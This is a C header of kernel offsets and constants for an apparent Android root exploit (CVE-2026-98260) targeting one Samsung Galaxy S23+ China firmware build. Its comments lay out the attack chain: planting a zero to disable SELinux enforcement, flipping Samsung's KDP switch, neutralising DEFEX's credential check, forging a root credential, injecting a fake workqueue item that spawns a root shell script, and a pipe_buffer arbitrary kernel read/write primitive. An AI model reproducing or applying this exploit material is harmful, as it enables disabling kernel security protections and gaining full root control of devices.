/*
 * offsets.h -- kernel offsets and per-device constants for the CVE-2026-98260
 * payload.  Everything in this file is specific to ONE kernel build; the
 * payload logic in timer.c is generic.
 *
 * Device: Samsung SM-S9160 (dm2q), Galaxy S23+ China, Snapdragon 8 Gen 2
 * Kernel: 5.15.189-android13-8-3251900-abS9160ZCS8FZJ1
 * Build : BP4A.251205.006.S9160ZCS8FZJ1 (Android 16 / One UI 8.5)
 *
 * Derived from the device's vmlinux.elf (symtab + disasm) and vmlinux.btf
 * (struct layouts), both extracted from boot.img in
 * Root-My-Galaxy-Payloads/firmware/S9160ZCS8FZJ1.  To port to another
 * kernel, re-derive each group:
 *   - *_STATIC   unslid (link-time) symbol addresses from the symbol table
 *   - *_SITE     kmem_cache_alloc return addresses (matched in the kmem
 *                trace against site_static + slide; slide is 64KB-granular)
 *   - *_LOW21    the low 21 bits of a site, for the trace record match
 *   - *_OFF      struct field offsets (BTF / disasm verified)
 *   - *_ALLOC / *_BYTES / *_REQ  kmem_cache object sizes
 */
#ifndef OFFSETS_H
#define OFFSETS_H

/* Page-size assumption: the linear-map pfn math and the order-1 reclaim
 * channel both hard-code 4 KB pages.  16 KB-page devices need a port. */
#define PAGE 4096UL

/* do_timer_create+0xa0, return address of the
 * kmem_cache_alloc(posix_timers_cache, GFP_KERNEL|__GFP_ZERO) call
 * (0xffffffc00820687c bl -> 0xffffffc008206880). */
#define STATIC_TIMER_SITE 0xffffffc008206880ULL
#define TIMER_SITE_LOW21 0x06880ULL
/* posix_timers_cache object: sizeof(struct k_itimer) on this build.
 * /proc/slabinfo: 264 bytes, 31 objects, order-1; no SLAB_HWCACHE_ALIGN,
 * so bytes_req == bytes_alloc. */
#define TIMER_ALLOC 0x108ULL

/* cred_jar: sizeof(struct cred) (176) and the HWCACHE_ALIGN bytes_alloc.
 * /proc/slabinfo: cred_jar 192 bytes; Samsung also has cred_jar_ro, but the
 * normal prepare_creds() path allocates from cred_jar. */
#define CRED_REQ 0xb0ULL
#define CRED_ALLOC 0xc0ULL
/*
 * Samsung KDP installs a read-only credential from cred_jar_ro during
 * commit_creds(): prepare_ro_creds() copies the normal cred into a
 * cred_jar_ro object (slabinfo: 256 bytes / 0x100, 32 per order-1 slab)
 * and that object becomes task->cred.  The exploit must write the live
 * ro-cred, not the 0xc0 normal cred.  The first of prepare_ro_creds'
 * three cred_jar_ro allocations is the credential; its kmem_cache_alloc
 * return address is 0xffffffc0091b6474.
 */
#define CRED_RO_REQ 0xd0ULL
#define CRED_RO_ALLOC 0x100ULL
#define RO_CRED_SITE_STATIC 0xffffffc0091b6474ULL
/* prepare_ro_creds' third cred_jar_ro allocation, kept for reference.
 * It is NOT the installed cred on 5.15: the function returns x19 (the
 * first allocation) via `mov x0, x19; ret`, and commit_creds stores that
 * return value into both task->real_cred (+0x790) and task->cred (+0x798):
 *   ffffffc0081204d4  bl prepare_ro_creds
 *   ffffffc0081204dc  stlr x0, [x20, #0x790]
 *   ffffffc0081204e4  stlr x0, [x20, #0x798]
 * RiosWesley's "last KDP wins" applies to its 6.1 allocation sequence, not
 * this one. */
#define RO_CRED_LAST_SITE_STATIC 0xffffffc0091b64a8ULL

/* Link-time addresses (symtab) and BTF field offsets. */
#define SELINUX_STATE_STATIC 0xffffffc00ad8e5c0ULL
#define PANIC_ON_WARN_STATIC 0xffffffc00aa8add0ULL

/*
 * selinux_state layout on this 5.15 build (BTF):
 *   bool enforcing;      +0
 *   bool checkreqprot;   +1
 *   bool initialized;    +2
 *   bool policycap[8];   +3
 * The rb_erase zero-plant aimed at selinux_state itself would clear
 * "initialized" too and the kernel then treats every SID as "before
 * initial load_policy": getpeercon() fails with EINVAL, all property sets
 * get PROP_ERROR_PERMISSION_DENIED, system_server dies and the softdog
 * panics the phone.  Instead aim the 8-byte zero at selinux_state-7: the
 * window covers the idle avc_latest_notif_update.notif_lock tail at -8
 * (zeroing is a no-op while uncontended), plus padding, plus enforcing
 * itself.  initialized stays 1.
 */
#define SELINUX_ENFORCE_ZAP (SELINUX_STATE_STATIC - 7ULL)

/*
 * workqueue UMH injection (fusion-s24u install_workqueue_umh_root, ported
 * to this 5.15 kernel's offsets).  A fake work_struct whose func is
 * call_usermodehelper_exec_work is linked into the idle system_unbound_wq
 * pool worklist; the kernel then spawns our helper as a legitimate root
 * usermodehelper, which sidesteps Samsung DEFEX entirely (no cred forgery
 * for it to catch).  Offsets verified against vmlinux.elf disasm / BTF:
 *   wq->dfl_pwq 0xb0 (a2+176 in __queue_work)
 *   pwq->pool 0x00, pwq->wq 0x08, pwq->work_color 0x10 (dword+16),
 *   pwq->nr_in_flight 0x1c+4*color, pwq->nr_active 0x5c, max_active 0x60
 *   pool->worklist 0x20, pool->nr_workers 0x30, pool->nr_idle 0x34
 *   work->data 0x00 (pwq|color<<4|5), work->entry 0x08, work->func 0x18
 */
#define SYSTEM_UNBOUND_WQ_STATIC 0xffffffc00aa90800ULL
/* .rodata string used as a strong signature for the image's physical
 * base: reading it at the candidate base must yield "Linux version". */
#define LINUX_BANNER_STATIC 0xffffffc00a011aa0ULL
/* core_pattern[256]: writable, root-readable through
 * /proc/sys/kernel/core_pattern, used by the write-primitive self test. */
#define CORE_PATTERN_STATIC 0xffffffc00ab5b6d0ULL
#define UMH_EXEC_WORK_STATIC 0xffffffc0081045d0ULL
#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x20
#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18
/*
 * subprocess_info / completion layouts (fusion-s24u root.c, layout matches
 * this kernel's struct subprocess_info size 112: work(48) complete path
 * argv envp wait retval init cleanup data).
 */
struct umh_completion
{
    unsigned done;
    unsigned pad0;
    unsigned lock;
    unsigned pad1;
    unsigned long long next;
    unsigned long long prev;
};
struct umh_kernel_data
{
    struct umh_completion completion; /* 32 */
    char path[256];                  /* the helper binary to exec */
    char arg[16];                    /* "--umh" */
    char uid[16];                    /* decimal client uid */
    unsigned long long argv[4];
    unsigned long long envp[1];
};
struct umh_subprocess_info
{
    unsigned char work[48]; /* work_struct: data/entry/func */
    unsigned long long complete;
    unsigned long long path;
    unsigned long long argv;
    unsigned long long envp;
    int wait;
    int retval;
    unsigned long long init;
    unsigned long long cleanup;
    unsigned long long data;
};
#define ROOT_UMH_WORK_OFF 0x400  /* fake work_struct inside the reclaimed page */
#define ROOT_UMH_DATA_OFF 0x800  /* umh_kernel_data inside the reclaimed page */
#define ROOT_UMH_PWQ_OFF 0xa00   /* fake pool_workqueue inside the page */
/*
 * The UMH helper runs /system/bin/sh on a script: the usermodehelper exec
 * must target a system-signed binary (a directly exec'ed helper from
 * /data/local/tmp can be killed by KDP/DEFEX before its first
 * instruction), while the script does the /system/bin/logcat bind-mount
 * KDP trick and the ksud late-load itself (BuSung umh_action.sh pattern).
 */
#define ROOT_UMH_PATH "/system/bin/sh"
#define ROOT_UMH_ARG "/data/local/tmp/samtimer/umh_action.sh"

/*
 * DEFEX credential-violation bypass: task_defex_check_creds() calls
 * get_task_creds(), which looks the task up in creds_fast_hash
 * (0xffffffc00ae0f720, .data -- writable, unlike the creds_fast_hash_ready
 * gate in rodata).  A NULL bucket entry makes get_task_creds return
 * stored uid 0, which matches the forged uid 0, so check_creds returns 0
 * (no violation).  creds_hash is an 8-byte pointer array indexed directly
 * by pid when pid <= 0x8000.  Only the fake-cred stage needs it; the UMH
 * chain uses a genuine kernel-issued root cred and never touches DEFEX.
 */
#define CREDS_FAST_HASH_STATIC 0xffffffc00ae0f720ULL

/* cred field offsets (BTF: usage is atomic_t(4), so uid starts at +4). */
#define CRED_UID_OFF 0x4ULL
/* securebits: clearing it drops Android's SECURE_NOROOT, so an euid=0
 * exec grants the bounding-set capabilities again. */
#define CRED_SECUREBITS_OFF 0x24ULL
/* Only capability/selinux/integrity are built in and only SELinux wants a
 * cred blob, so lsm_set_blob_sizes() leaves its offset at 0. */
#define SELINUX_BLOB_OFF 0x0ULL
#define SELINUX_SID_KERNEL 1U
/* Full bounding set (CAP_LAST_CAP+1 bits). */
#define FULLCAP 0x1ffffffffffULL

/*
 * Samsung KDP master switch (kdp_enable), portable from the S928B/EZIF port.
 * Verified in THIS image's disassembly:
 *   security_integrity_current+0x34  ldrb w8,[x8,#0xdc8] ; cbz -> no-op
 *   kdp_get_usecount+0x10            ldrb w8,[x8,#0xdc8] ; cbz -> cred->usage
 * With kdp_enable == 0 the "KDP CRED PROTECTION VIOLATION" check is skipped
 * and the KDP refcount helpers fall back to cred->usage, so a forged
 * task->cred survives its first context switch.  Byte-wide: write exactly one
 * byte (the 8-byte zero plants would also clear the neighbouring KDP globals).
 * KDP watches the kernel-image mapping, so the write must go through the
 * linear-map alias -- user_pipe_write() already converts image VAs that way.
 */
#define KDP_ENABLE_STATIC 0xffffffc00a194dc8ULL

/* Link-time symbols for the fake cred's refcounted sub-objects. */
#define ROOT_USER_STATIC 0xffffffc00aab16d0ULL
#define INIT_USER_NS_STATIC 0xffffffc00ac29180ULL
#define INIT_UCOUNTS_STATIC 0xffffffc00aab2ae8ULL
#define INIT_GROUPS_STATIC 0xffffffc00aab2770ULL

/* task_struct::cred and dup_task_struct()'s task_struct_cachep call site.
 * BTF: real_cred +0x790, cred +0x798; /proc/slabinfo: task_struct 4608
 * bytes (0x1200), 7 objects, order-3. */
#define OFF_TASK_CRED 0x798ULL
#define TASK_ALLOC_LOW21 0xc9e14ULL
#define TASK_ALLOC_BYTES 0x1200ULL
/* Unslid call sites (from vmlinux.elf): prepare_creds' kmem_cache_alloc
 * return address (0xffffffc00811eb64) and dup_task_struct's
 * kmem_cache_alloc return address (0xffffffc0080c9e14).  The runtime
 * slide is 64KB-granular, so sites are matched as site_static + slide. */
#define CRED_SITE_STATIC 0xffffffc00811eb64ULL
#define TASK_SITE_STATIC 0xffffffc0080c9e14ULL

/*
 * posix-cpu-timer queue leftmosts inside task_struct.  BTF:
 * task->posix_cputimers at 0x738, bases[3] stride 0x18, each
 * posix_cputimer_base.tqhead at +8, rb_root_cached.rb_leftmost at +8;
 * so task+0x748/0x760/0x778.  Disassembly of posix_cpu_timers_exit
 * confirms the walk loads [x0,#0x748], [x0,#0x760], [x0,#0x778] and skips
 * a queue whose leftmost is NULL.  Zeroing these three makes a reap of a
 * failed-plant zombie safe.
 */
#define OFF_TQ_LEFTMOST_0 0x748ULL
#define OFF_TQ_LEFTMOST_1 0x760ULL
#define OFF_TQ_LEFTMOST_2 0x778ULL

/*
 * task_struct::loginuid (BTF: +0x858; sessionid at +0x860).  The
 * zombie-repair probe writes here and reads it back through
 * /proc/<pid>/loginuid, which is world-readable -- unlike panic_on_warn,
 * which is root-only on Samsung builds.
 */
#define OFF_TASK_LOGINUID 0x858ULL

/*
 * pipe_buffer kernel read/write primitive (RiosWesley/SamTimer design):
 * one timer plant repoints pipe->bufs (pipe_inode_info+0xa8) at a fake
 * pipe_buffer whose ->page is the vmemmap struct page of the target RAM
 * page.  read() then copies kernel memory to userspace, and a CAN_MERGE
 * write() merges into it.  Constants:
 *   ANON_PIPE_BUF_OPS_STATIC  anon_pipe_buf_ops link-time address
 *                             (readelf -sW vmlinux.elf)
 *   VMEMMAP_BASE              vmemmap region base (VA_BITS=39 layout)
 *   STRUCT_PAGE_SIZE          sizeof(struct page) = 0x40
 *   MEMSTART_ADDR             physical DRAM base (Qualcomm: 0x80000000);
 *                             verified from the target P0 payload profile
 *                             and /proc/iomem on the device family
 *   PIPE_INFO_BUF_OFF         pipe_inode_info::bufs (BTF: +0xa8)
 *   PIPE_BUF_FAKE_OFF         where the fake pipe_buffer sits relative to
 *                             the rb node (buffer slot 1: pipe->tail == 1)
 */
#define ANON_PIPE_BUF_OPS_STATIC 0xffffffc009e7f8e0ULL
#define VMEMMAP_BASE 0xfffffffe00000000ULL
#define MEMSTART_ADDR 0x80000000ULL
#define STRUCT_PAGE_SIZE 0x40ULL
#define PIPE_INFO_BUF_OFF 0xa8
#define PIPE_HEAD_OFF 0x60
#define PIPE_TAIL_OFF 0x64ULL
#define PIPE_BUF_FAKE_OFF 0x28ULL

/*
 * Kernel-image physical layout: symbols in the kernel image (.data like
 * system_unbound_wq) are read through their linear-map alias, which needs
 * the physical load address of the (unslid) image; the KASLR slide is
 * added at use.  KERNEL_PHYS_LOAD is the boot loader's kernel load
 * address.  The S9160 boot image carries text_offset 0x0 and the Samsung
 * arm64 convention loads Image at 0x80080000 (the same value the verified
 * CVE-2026-43499 P0 profile uses for this exact firmware).
 */
#define KERNEL_VA_BASE 0xffffffc008000000ULL
#define KERNEL_PHYS_LOAD 0x80080000ULL
/* Unslid kernel phys-base candidates for the dry-run validation loop. */
/* 0xa8000000 first: the reference session measured the running image at
 * 0xa8000000 + slide (e.g. 0xa81d8000) and validated it as "events_unbound"
 * there; the rest are fallbacks for other boots. */
/* Only candidates that are backed by real DRAM.  0xa8000000 is the measured
 * image base; 0x80080000 is the bootloader Image load.  The other guesses
 * (0xa0000000, 0x88000000, 0x90000000, 0xb0000000) are physical holes and
 * fault in __arch_copy_to_user when the dry-run tries to read linux_banner. */
#define KERNEL_PHYS_CANDIDATES \
    0xa8000000ULL, 0x80080000ULL

/*
 * worker_pool idle accounting, for the UMH injection's "pool must be
 * idle" check (BTF: worklist list_head at 0x20, nr_workers 0x30,
 * nr_idle 0x34; validated in the umh dry run).
 */
#define POOL_NR_WORKERS_OFF 0x30
#define POOL_NR_IDLE_OFF 0x34

#endif /* OFFSETS_H */
